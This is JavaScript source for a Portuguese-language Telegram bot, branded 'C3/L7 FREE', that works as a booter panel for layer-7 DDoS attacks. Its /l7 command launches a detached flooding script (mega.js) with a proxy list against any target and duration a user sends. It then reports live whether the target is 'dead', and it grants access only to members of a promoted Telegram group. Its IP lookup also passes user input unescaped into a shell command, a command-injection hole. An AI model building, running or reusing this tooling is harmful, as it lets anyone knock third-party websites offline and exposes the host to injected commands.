const { Telegraf, Markup } = require('telegraf');
const { spawn, exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const https = require('https');
const http = require('http');
const path = require('path');

const BOT_TOKEN = 'COLOCA TEU TOKEN AQ0v3ad1eCHk8dlro1RXUw';
const GRUPO_ID = '@frenthaut';
const GRUPO_LINK = 'https://t.me/frenthaut';

const bot = new Telegraf(BOT_TOKEN);

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function gerarBarra(porcentagem, tamanho = 10) {
    const preenchido = Math.round((porcentagem / 100) * tamanho);
    const vazio = tamanho - preenchido;
    return `[${'█'.repeat(preenchido)}${'░'.repeat(vazio)}]`;
}

function resolverIP(host) {
    return new Promise((resolve) => {
        const hostname = host.replace(/^https?:\/\//, '').split('/')[0];
        exec(`dig +short ${hostname} | head -1`, (error, stdout) => {
            resolve(error || !stdout.trim() ? 'N/A' : stdout.trim());
        });
    });
}

function checarAlvo(target) {
    return new Promise((resolve) => {
        const url = target.startsWith('http') ? target : `https://${target}`;
        const lib = url.startsWith('https') ? https : http;
        const req = lib.get(url, { timeout: 5000 }, (res) => {
            if (res.statusCode >= 200 && res.statusCode < 400) {
                resolve(`🟢 ONLINE (${res.statusCode})`);
            } else {
                resolve(`🔴 MORTO (HTTP ${res.statusCode})`);
            }
            req.destroy();
        });
        req.on('error', (err) => {
            if (err.code === 'ETIMEDOUT' || err.code === 'ESOCKETTIMEDOUT') {
                resolve('💀 MORTO (Timeout)');
            } else if (err.code === 'ECONNREFUSED') {
                resolve('💀 MORTO (Conexão Recusada)');
            } else {
                resolve(`❌ ERRO (${err.code || 'Desconhecido'})`);
            }
        });
        req.on('timeout', () => {
            req.destroy();
            resolve('💀 MORTO (Timeout)');
        });
    });
}

async function estaNoGrupo(userId) {
    try {
        const member = await bot.telegram.getChatMember(GRUPO_ID, userId);
        return ['member', 'administrator', 'creator'].includes(member.status);
    } catch (e) {
        return false;
    }
}

function menuGrupo() {
    return Markup.inlineKeyboard([
        [Markup.button.url('📢 Entrar no Grupo', GRUPO_LINK)],
        [Markup.button.callback('✅ Verificar', 'verificar')]
    ]);
}

function textoMenu() {
    return (
        `🔥 <b>C3/L7 FREE</b>\n\n` +
        `📖 <b>EX DE USO:</b>\n` +
        `/l7 alvo.com time\n` +
        `/l7 alvo.com 120\n\n` +
        `⚠️ <b>Para usar é necessário estar no grupo:</b>\n` +
        `${GRUPO_LINK}\n\n` +
        `👉 Entre no grupo e clique em <b>Verificar</b>.`
    );
}

async function iniciarPainelAtaque(ctx, alvo, tempo, msgId) {
    const chatId = ctx.chat.id;
    const startTime = Date.now();
    const ipAlvo = await resolverIP(alvo);

    const loop = setInterval(async () => {
        const decorrido = Math.floor((Date.now() - startTime) / 1000);
        const restante = Math.max(0, tempo - decorrido);
        const pct = Math.min(100, Math.floor((decorrido / tempo) * 100));
        const barra = gerarBarra(pct);
        const statusTxt = await checarAlvo(alvo);

        const texto =
            `🚀 <b>MONITOR DE ATAQUE</b>\n\n` +
            `🎯 <b>Alvo:</b> <code>${alvo}</code>\n` +
            `📡 <b>IP:</b> <code>${ipAlvo}</code>\n` +
            `⏱️ <b>Time:</b> ${tempo}s\n` +
            `📉 <b>Restam:</b> ${restante}s\n` +
            `📊 <b>Status:</b> ${statusTxt}\n\n` +
            `<b>Progresso:</b>\n` +
            `<code>${barra} ${pct}%</code>`;

        try {
            await ctx.telegram.editMessageText(chatId, msgId, null, texto, { parse_mode: 'HTML' });
        } catch (err) {}

        if (restante <= 0) {
            clearInterval(loop);
            try {
                await ctx.telegram.sendMessage(chatId, `⏹️ <b>Ataque finalizado</b> contra <code>${alvo}</code>`, { parse_mode: 'HTML' });
            } catch (e) {}
        }
    }, 3000);
}

bot.start(async (ctx) => {
    if (ctx.chat.type !== 'private') return;
    await ctx.replyWithHTML(textoMenu(), menuGrupo());
});

bot.command('menu', async (ctx) => {
    if (ctx.chat.type !== 'private') return;
    await ctx.replyWithHTML(textoMenu(), menuGrupo());
});

bot.command('l7', async (ctx) => {
    if (ctx.chat.type !== 'private') return;

    const noGrupo = await estaNoGrupo(ctx.from.id);
    if (!noGrupo) {
        return ctx.replyWithHTML(
            `❌ <b>Você não está no grupo!</b>\n\nEntre no grupo abaixo e clique em <b>Verificar</b>.`,
            menuGrupo()
        );
    }

    try {
        const args = ctx.message.text.split(' ');
        if (args.length < 3) {
            return ctx.reply('⚠️ Uso correto: /l7 alvo.com 120');
        }

        const alvo = args[1];
        const tempo = parseInt(args[2]);

        if (isNaN(tempo) || tempo < 1 || tempo > 3600) {
            return ctx.reply('⚠️ O tempo deve ser um número entre 1 e 3600.');
        }

        if (!fs.existsSync('./mega.js')) {
            return ctx.reply('❌ Erro: O arquivo mega.js não foi encontrado nesta pasta.');
        }

        if (!fs.existsSync('./proxy.txt')) {
            fs.writeFileSync('./proxy.txt', '');
        }

        const comandoArgs = ['mega.js', alvo, tempo.toString(), '15', '5', 'proxy.txt'];

        console.log('▶️ Executando: node ' + comandoArgs.join(' '));

        const proc = spawn('node', comandoArgs, {
            cwd: path.resolve('./'),
            stdio: 'ignore',
            detached: true
        });
        proc.unref();

        const msg = await ctx.replyWithHTML(
            `⏳ <b>Iniciando ataque contra</b> <code>${alvo}</code>...\nAguarde o painel de progresso.`
        );

        iniciarPainelAtaque(ctx, alvo, tempo, msg.message_id);

    } catch (err) {
        ctx.reply('❌ Erro interno: ' + err.message);
    }
});

bot.action('verificar', async (ctx) => {
    try {
        const noGrupo = await estaNoGrupo(ctx.from.id);
        if (noGrupo) {
            await ctx.answerCbQuery('✅ Verificado! Você está no grupo.', { show_alert: true });
            await ctx.editMessageText(
                `✅ <b>Verificado com sucesso!</b>\n\nAgora você pode usar:\n/l7 alvo.com 120`,
                { parse_mode: 'HTML' }
            );
        } else {
            await ctx.answerCbQuery('❌ Você não está no grupo!', { show_alert: true });
            await ctx.replyWithHTML(
                `❌ <b>Você não está no grupo!</b>\n\nEntre primeiro: ${GRUPO_LINK}`,
                menuGrupo()
            );
        }
    } catch (e) {
        await ctx.answerCbQuery('❌ Erro ao verificar.', { show_alert: true });
    }
});

bot.command('st', async (ctx) => {
    if (ctx.chat.type !== 'private') return;
    try {
        const cpus = os.cpus().length;
        const load = os.loadavg()[0];
        const cpuPct = Math.min(100, (load / cpus) * 100).toFixed(1);
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const usedMem = totalMem - freeMem;
        const memPct = ((usedMem / totalMem) * 100).toFixed(1);

        exec("df -k / | tail -1 | awk '{print $2, $3, $4, $5}'", (err, stdout) => {
            let discoTotal = 0, discoUsado = 0, discoPct = 0;
            if (!err && stdout) {
                const parts = stdout.trim().split(/\s+/);
                if (parts.length >= 4) {
                    discoTotal = parseInt(parts[0]) * 1024;
                    discoUsado = parseInt(parts[1]) * 1024;
                    discoPct = parseInt(parts[3].replace('%', ''));
                }
            }

            const texto =
                `🖥️ <b>STATUS DA VPS</b>\n\n` +
                `🧠 <b>RAM</b> (${memPct}%)\n` +
                `├ Usada: ${formatBytes(usedMem)} / ${formatBytes(totalMem)}\n` +
                `└ <code>${gerarBarra(memPct)}</code>\n\n` +
                `⚙️ <b>CPU</b> (${cpus} núcleos)\n` +
                `├ Carga: ${cpuPct}%\n` +
                `└ <code>${gerarBarra(cpuPct)}</code>\n\n` +
                `💾 <b>Armazenamento</b> (${discoPct}%)\n` +
                `├ Usado: ${formatBytes(discoUsado)} / ${formatBytes(discoTotal)}\n` +
                `└ <code>${gerarBarra(discoPct)}</code>`;

            ctx.replyWithHTML(texto).catch(() => {});
        });
    } catch (err) {
        ctx.reply('❌ Erro ao ler status: ' + err.message);
    }
});

bot.launch().then(() => {
    console.log('=======================================');
    console.log('🤖 BOT C3/L7 FREE ONLINE');
    console.log('=======================================');
    console.log('Comandos:');
    console.log('/start - Menu');
    console.log('/l7 alvo.com 120');
    console.log('/st');
    console.log('=======================================');
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
